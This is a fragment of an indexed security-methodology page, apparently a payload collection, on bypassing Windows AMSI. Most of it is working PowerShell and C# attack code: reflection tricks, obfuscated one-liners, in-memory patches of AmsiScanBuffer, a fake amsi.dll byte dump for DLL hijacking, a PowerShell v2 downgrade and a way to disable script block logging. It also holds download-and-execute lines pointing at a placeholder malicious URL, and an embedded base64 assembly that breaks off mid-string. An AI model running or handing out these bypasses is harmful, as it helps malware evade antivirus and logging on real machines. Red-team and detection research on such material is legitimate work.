0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 24 0 0 0 24 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 0 0 48 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 72 0 0 0 96 96 0 0 125 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 63 120 109 108 32 118 101 114 115 105 111 110 61 39 49 46 48 39 32 101 110 99 111 100 105 110 103 61 39 85 84 70 45 56 39 32 115 116 97 110 100 97 108 111 110 101 61 39 121 101 115 39 63 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 39 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 39 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 39 49 46 48 39 62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 39 97 115 73 110 118 111 107 101 114 39 32 117 105 65 99 99 101 115 115 61 39 102 97 108 115 101 39 32 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 24 0 0 0 248 160 0 161 88 161 96 161 56 162 80 162 88 162 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\" if (([IntPtr]::Size) -eq 8) { Write-Verbose \"64 bit process detected.\" $DllBytes = $AmsiX64 } elseif (([IntPtr]::Size) -eq 4) { Write-Verbose \"32 bit process detected.\" $DllBytes = $AmsiX86 } switch($method) { \"unload\" { Write-Verbose \"Using Matt Graeber's Reflection method.\" if ($ShowOnly -eq $True) { Write-Output \"Use the following scriptblock before you run a script which gets detected.\" Write-Output '[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)' } else { Write-Output \"Executing the bypass.\" [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) } } \"unloadsilent\" { Write-Verbose \"Using Matt Graeber's Reflection method with WMF5 autologging bypass.\" if ($ShowOnly -eq $True) { Write-Output \"Use the following scriptblock before you run a script which gets detected.\" Write-Output '[Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType(''System.Reflection.Bindin''+''gFlags'')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType(''System.T''+''ype'')), [Object]([Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'')),(''GetFie''+''ld'')).Invoke(''amsiInitFailed'',((''Non''+''Public,Static'') -as [String].Assembly.GetType(''System.Reflection.Bindin''+''gFlags''))).SetValue($null,$True)' } else { Write-Output \"Executing the bypass.\" [Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True) } } \"unloadobfuscated\" { Write-Verbose \"Using Matt Graeber's Reflection method with obfuscation from Daneil Bohannon's Invoke-Obfuscation - which bypasses WMF5 autologging.\" if ($ShowOnly -eq $True) { $code = @\" Sv ('R9'+'HYt') ( \" ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(ecalpeR.)')eurt'+'aEm,llun'+'aEm(eulaVt'+'eS'+'.)UCScit'+'atS,ci'+'lbuPnoNUCS'+',U'+'CSdeli'+'aFt'+'inI'+'is'+'maUCS('+'dle'+'iF'+'teG'+'.'+')'+'UCSslitU'+'is'+'mA.noitamotu'+'A.tn'+'em'+'eganaM.'+'m'+'e'+'t'+'sySUCS(epy'+'TteG.ylbmessA'+'.]'+'feR['( (noisserpxE-ekovnI\" ); Invoke-Expression( -Join ( VaRIAbLe ('R9'+'hyT') -val )[ - 1..- (( VaRIAbLe ('R9'+'hyT') -val ).Length)]) \"@ Write-Output \"Use the following scriptblock before you run a script which gets detected.\" Write-Output $code } else { Write-Output \"Executing the bypass.\" Sv ('R9'+'HYt') ( \" ) )93]rahC[]gnirtS[,'UCS'(ecalpeR.)63]rahC[]gnirtS[,'aEm'(ecalpeR.)')eurt'+'aEm,llun'+'aEm(eulaVt'+'eS'+'.)UCScit'+'atS,ci'+'lbuPnoNUCS'+',U'+'CSdeli'+'aFt'+'inI'+'is'+'maUCS('+'dle'+'iF'+'teG'+'.'+')'+'UCSslitU'+'is'+'mA.noitamotu'+'A.tn'+'em'+'eganaM.'+'m'+'e'+'t'+'sySUCS(epy'+'TteG.ylbmessA'+'.]'+'feR['( (noisserpxE-ekovnI\" ); Invoke-Expression( -Join ( VaRIAbLe ('R9'+'hyT') -val )[ - 1..- (( VaRIAbLe ('R9'+'hyT') -val ).Length)]) } } \"unload2\" { Write-Verbose \"Using Matt Graeber's second Reflection method.\" if ($ShowOnly -eq $True) { Write-Output \"Use the following scriptblock before you run a script which gets detected.\" Write-Output '[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiContext'',[Reflection.BindingFlags]''NonPublic,Static'').GetValue($null),0x41414141)' } else { Write-Output \"Executing the bypass.\" [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141) } } \"dllhijack\" { Write-Verbose \"Using Cornelis de Plaa's DLL hijack method.\" if ($ShowOnly -eq $True) { Write-Output \"Copy powershell.exe from C:\\Windows\\System32\\WindowsPowershell\\v1.0 to a local folder and dropa fake amsi.dll in the same directory.\" Write-Output \"Run the new powershell.exe and AMSI should be gone for that session.\" } else { [Byte[]] $temp = $DllBytes -split ' ' Write-Output \"Executing the bypass.\" Write-Verbose \"Dropping the fake amsi.dll to disk.\" [System.IO.File]::WriteAllBytes(\"$pwd\\amsi.dll\", $temp) Write-Verbose \"Copying powershell.exe to the current working directory.\" Copy-Item -Path C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Destination $pwd Write-Verbose \"Starting powershell.exe from the current working directory.\" & \"$pwd\\powershell.exe\" } } \"psv2\" { Write-Verbose \"Using PowerShell version 2 which doesn't support AMSI.\" if ($ShowOnly -eq $True) { Write-Output \"If .Net version 2.0.50727 is installed, run powershell -v 2 and run scripts from the new PowerShell process.\" } else { Write-Verbose \"Checking if .Net version 2.0.50727 is installed.\" $versions = Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match '^(?!S)\\p{L}'} | Select -ExpandProperty Version if($versions -match \"2.0.50727\") { Write-Verbose \".Net version 2.0.50727 found.\" Write-Output \"Executing the bypass.\" powershell.exe -version 2 } else { Write-Verbose \".Net version 2.0.50727 not found. Can't start PowerShell v2.\" } } } \"obfuscation\" { Write-Output \"AMSI and the AVs which support it can be bypassed using obfuscation techqniues.\" Write-Output \"ISE-Steroids (http://www.powertheshell.com/isesteroidsmanual/download/) and Invoke-Obfuscation can be used (https://github.com/danielbohannon/Invoke-Obfuscation).\" } } } Adam Chester Patch Bypass Update by Adam Chester https://twitter.com/ xpn /status/1170852932650262530 $Winpatch = @\" using System; using System.Runtime.InteropServices; public class patch { // https://twitter.com/_xpn_/status/1170852932650262530 static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }; public static void it() { if (is64Bit()) PatchAmsi(x64); else PatchAmsi(x86); } private static void PatchAmsi(byte[] patch) { try { var lib = Win32.LoadLibrary(\"a\" + \"ms\" + \"i.dll\"); var addr = Win32.GetProcAddress(lib, \"AmsiScanBuffer\"); uint oldProtect; Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect); Marshal.Copy(patch, 0, addr, patch.Length); Console.WriteLine(\"Patch Sucessfull\"); } catch (Exception e) { Console.WriteLine(\" [x] {0}\", e.Message); Console.WriteLine(\" [x] {0}\", e.InnerException); } } private static bool is64Bit() { bool is64Bit = true; if (IntPtr.Size == 4) is64Bit = false; return is64Bit; } } class Win32 { [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string name); [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); } \"@ Add-Type -TypeDefinition $Winpatch -Language CSharp [patch]::it() AMSI.fail AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. The snippets are randomly selected from a small pool of techniques/variations before being obfuscated. Every snippet is obfuscated at runtime/request so that no generated output share the same signatures. - https://amsi.fail/ References S3cur3Th1sSh1t - Amsi-Bypass-Powershell","title":"AMSI Bypass"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#amsi-bypass","text":"","title":"AMSI Bypass"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#summary","text":"Which Endpoint Protection is Using AMSI Patching amsi.dll AmsiScanBuffer by rasta-mouse Dont use net webclient Amsi ScanBuffer Patch from -> https://www.contextis.com/de/blog/amsi-bypass Forcing an error Disable Script Logging Amsi Buffer Patch - In memory Same as 6 but integer Bytes instead of Base64 Using Matt Graeber's Reflection method Using Matt Graeber's Reflection method with WMF5 autologging bypass Using Matt Graeber's second Reflection method Using Cornelis de Plaa's DLL hijack method Use Powershell Version 2 - No AMSI Support there Nishang all in one Adam Chesters Patch AMSI.fail","title":"Summary"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#which-endpoint-protection-is-using-amsi","text":"https://github.com/subat0mik/whoamsi/wiki/Which-Endpoint-Protection-is-Using-AMSI%3F","title":"Which Endpoint Protection is Using AMSI"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#patching-amsidll-amsiscanbuffer-by-rasta-mouse","text":"$Win32 = @\" using System; using System.Runtime.InteropServices; public class Win32 { [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string name); [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); } \"@ Add-Type $Win32 $LoadLibrary = [Win32]::LoadLibrary(\"am\" + \"si.dll\") $Address = [Win32]::GetProcAddress($LoadLibrary, \"Amsi\" + \"Scan\" + \"Buffer\") $p = 0 [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p) $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)","title":"Patching amsi.dll AmsiScanBuffer by rasta-mouse"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#dont-use-net-webclient","text":"Not Working anymore, there was a patch for it $webreq = [System.Net.WebRequest]::Create(\u2018https://maliciousscripturl/malicious.ps1\u2019) $resp=$webreq.GetResponse() $respstream=$resp.GetResponseStream() $reader=[System.IO.StreamReader]::new($respstream) $content=$reader.ReadToEnd() IEX($content)","title":"Dont use net webclient"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#the-short-version-of-dont-use-powershell-net-webclient","text":"Not Working anymore, there was a patch for it IEX([Net.Webclient]::new().DownloadString(\"https://maliciousscripturl/malicious.ps1\"))","title":"The Short version of dont use powershell net webclient"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#amsi-scanbuffer-patch","text":"Egghunter with blog post: https://www.contextis.com/us/blog/amsi-bypass Write-Host \"-- AMSI Patch\" Write-Host \"-- Paul La\u00een\u00e9 (@am0nsec)\" Write-Host \"\" $Kernel32 = @\" using System; using System.Runtime.InteropServices; public class Kernel32 { [DllImport(\"kernel32\")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName); [DllImport(\"kernel32\")] public static extern IntPtr LoadLibrary(string lpLibFileName); [DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); } \"@ Add-Type $Kernel32 Class Hunter { static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) { while ($true) { [int]$count = 0 while ($true) { [IntPtr]$address = [IntPtr]::Add($address, 1) If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) { $count++ If ($count -eq $egg.Length) { return [IntPtr]::Subtract($address, $egg.Length - 1) } } Else { break } } } return $address } } [IntPtr]$hModule = [Kernel32]::LoadLibrary(\"amsi.dll\") Write-Host \"[+] AMSI DLL Handle: $hModule\" [IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, \"DllCanUnloadNow\") Write-Host \"[+] DllCanUnloadNow address: $dllCanUnloadNowAddress\" If ([IntPtr]::Size -eq 8) { Write-Host \"[+] 64-bits process\" [byte[]]$egg = [byte[]] ( 0x4C, 0x8B, 0xDC, # mov r11,rsp 0x49, 0x89, 0x5B, 0x08, # mov qword ptr [r11+8],rbx 0x49, 0x89, 0x6B, 0x10, # mov qword ptr [r11+10h],rbp 0x49, 0x89, 0x73, 0x18, # mov qword ptr [r11+18h],rsi 0x57, # push rdi 0x41, 0x56, # push r14 0x41, 0x57, # push r15 0x48, 0x83, 0xEC, 0x70 # sub rsp,70h ) } Else { Write-Host \"[+] 32-bits process\" [byte[]]$egg = [byte[]] ( 0x8B, 0xFF, # mov edi,edi 0x55, # push ebp 0x8B, 0xEC, # mov ebp,esp 0x83, 0xEC, 0x18, # sub esp,18h 0x53, # push ebx 0x56 # push esi ) } [IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg) Write-Host \"[+] Targeted address: $targetedAddress\" $oldProtectionBuffer = 0 [Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null $patch = [byte[]] ( 0x31, 0xC0, # xor rax, rax 0xC3 # ret ) [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3) $a = 0 [Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null","title":"Amsi ScanBuffer Patch"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#forcing-an-error","text":"$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076) [Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiSession\",\"NonPublic,Static\").SetValue($null, $null);[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiContext\",\"NonPublic,Static\").SetValue($null, [IntPtr]$mem)","title":"Forcing an error"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#disable-script-logging","text":"$settings = [Ref].Assembly.GetType(\"System.Management.Automation.Utils\").GetField(\"cachedGroupPolicySettings\",\"NonPublic,Static\").GetValue($null); $settings[\"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\"] = @{} $settings[\"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\"].Add(\"EnableScriptBlockLogging\", \"0\") [Ref].Assembly.GetType(\"System.Management.Automation.ScriptBlock\").GetField(\"signatures\",\"NonPublic,static\").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))","title":"Disable Script Logging"},{"location":"Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/#amsi-buffer-patch-in-memory","text":"function Bypass-AMSI { if(-not ([System.Management.Automation.PSTypeName]\"Bypass.AMSI\").Type) { [Reflection.Assembly]::Load([Convert]::FromBase64String(\"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YXJkAERpc2FibGUAUnVudGltZUZpZWxkSGFuZGxlAENvbnNvbGUAaE1vZHVsZQBwcm9jTmFtZQBuYW1lAFdyaXRlTGluZQBWYWx1ZVR5cGUAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAFRhcmdldEZyYW1ld29ya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5SW5mb3JtYXRpb25hbFZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBCeXRlAGR3U2l6ZQBzaXplAFN5c3RlbS5SdW50aW1lLlZlcnNpb25pbmcAQWxsb2NIR2xvYmFsAE1hcnNoYWwAS2VybmVsMzIuZGxsAEFtc2lCeXBhc3MuZGxsAFN5c3RlbQBTeXN0ZW0uUmVmbGVjdGlvbgBvcF9BZGRpdGlvbgBaZXJvAC5jdG9yAFVJbnRQdHIAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAFJ1bnRpbWVIZWxwZXJzAEFtc2lCeXBhc3MAR2V0UHJvY0FkZHJlc3MAbHBBZGRyZXNzAE9iamVjdABscGZsT2xkUHJvdGVjdABWaXJ0dWFsUHJvdGVjdABmbE5ld1Byb3RlY3QAb3BfRXhwbGljaXQAZGVzdABJbml0aWFsaXplQXJyYXkAQ29weQBMb2FkTGlicmFyeQBSdGxNb3ZlTWVtb3J5AG9wX0VxdWFsaXR5AAARYQBtAHMAaQAuAGQAbABsAABXRQBSAFIATwBSADoAIABDAG8AdQBsAGQAIABuAG8AdAAgAHIAZQB0AHIAaQBlAHYAZQAgAGEAbQBzAGkALgBkAGwAbAAgAHAAbwBpAG4AdABlAHIALgAAHUEAbQBzAGkAUwBjAGEAbgBCAHUAZgBmAGUAcgAAc0UAUgBSAE8AUgA6ACAAQwBvAHUAbABkACAAbgBvAHQAIAByAGUAdAByAGkAZQB2AGUAIABBAG0AcwBpAFMAYwBhAG4AQgB1AGYAZgBlAHIAIABmAHUAbgBjAHQAaQBvAG4AIABwAG8AaQBuAHQAZQByAAB1RQBSAFIATwBSADoAIABDAG8AdQBsAGQAIABuAG8AdAAgAGMAaABhAG4AZwBlACAAQQBtAHMAaQBTAGMAYQBuAEIAdQBmAGYAZQByACAAbQBlAG0AbwByAHkAIABwAGUAcgBtAGkAcwBzAGkAbwBuAHMAIQAAU0cAcgBlAGEAdAAgAHMAdQBjAGMAZQBzAHMALgAgAEEAbQBzAGkAUwBjAGEAbgBCAHUAZgBmAGUAcgAgAHAAYQB0AGMAaABlAGQAIQAgADoAKQAAALj1zdc1kW1DrpRSfqgqDIUABCABAQgDIAABBSABARERBCABAQ4NBwoYGBkJHQUYAggCAgIGGAUAAgIYGAQAAQEOBAABGQsHAAIBElERVQQAARgICAAEAR0FCBgIBQACGBgICMx7E//NLd1RAwYREAUAAhgYDgQAARgOCAAEAhgZCRAJBgADARgYCAMAAAgIAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBCAEABwEAAAAANgEAGS5ORVRTdGFuZGFyZCxWZXJzaW9uPXYyLjABAFQOFEZyYW1ld29ya0Rpc3BsYXlOYW1lAA8BAApBbXNpQnlwYXNzAAAKAQAFRGVidWcAAAwBAAcxLjAuMC4wAAAKAQAFMS4wLjAAAAQBAAAAAAAAAAAAOsRk5QABTVACAAAAZAAAAHwrAAB8DQAAAAAAAAAAAAABAAAAEwAAACcAAADgKwAA4A0AAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAABSU0RTjA86n5+khUmILRfMmrpC/wEAAAAvb3B0L1Byb2plY3RzL0Ftc2lCeXBhc3MvQW1zaUJ5cGFzcy9vYmovRGVidWcvbmV0c3RhbmRhcmQyLjAvQW1zaUJ5cGFzcy5wZGIAU0hBMjU2AIwPOp+fpIWJyC0XzJq6Qv86xGTlbSfIKidw8ohPKRL4LywAAAAAAAAAAAAASSwAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAADssAAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAAD/JQAgABAxgAAAAAAAAAAAAAAAAAAAAQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAADUAgAAAAAAAA